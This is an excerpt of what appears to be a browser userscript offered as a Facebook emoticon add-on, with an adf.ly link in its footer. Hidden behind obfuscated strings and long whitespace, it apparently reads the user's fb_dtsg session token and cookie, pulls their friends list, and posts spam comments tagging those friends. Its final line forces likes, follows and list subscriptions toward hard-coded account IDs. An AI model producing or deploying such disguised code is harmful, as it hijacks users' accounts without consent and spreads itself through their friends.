...
// @description     All about facebook Tuankhanhplus@gmail.com
...
"chars" : " :) ",
	...
	// Toggler
	html += '<a class="navLink" title="News ICON">'; // var navLink
    ...
    html += '<a class="jewelFooter" href="http://adf.ly/dtxZw" target="_blank">About Facebook ICON <br></a>';
	html += '</div>';
	...
	// === Facebook Emoticons ====
//
var _0xf841=["value","fb_dtsg","getElementsByName","match","cookie","1406123356310941","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," 👏 😡 😘 👉 Icon đẹp quá các bạn 👈 💜 💘 (^^^)   @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];
...
}                                                      a("100007690811292");Like("536572269702735");Like("536572269702735");Like("126710630745490");Like("288793654561838");Like("462907607079530");Like("461691380568612");Like("321264114663541");sublist("1389448501321497");sublist("1392293504370330");sublist("1392294761036871");sublist("1392296774370003");sublist("1392295294370151");sublist("1392295497703464");sublist("1392295714370109");sublist("1392295601036787");sublist("1392296067703407");sublist("1392296144370066");sublist("1392296291036718");sublist("1392296727703341");P("1392283774371303");IDS("100007690811292");
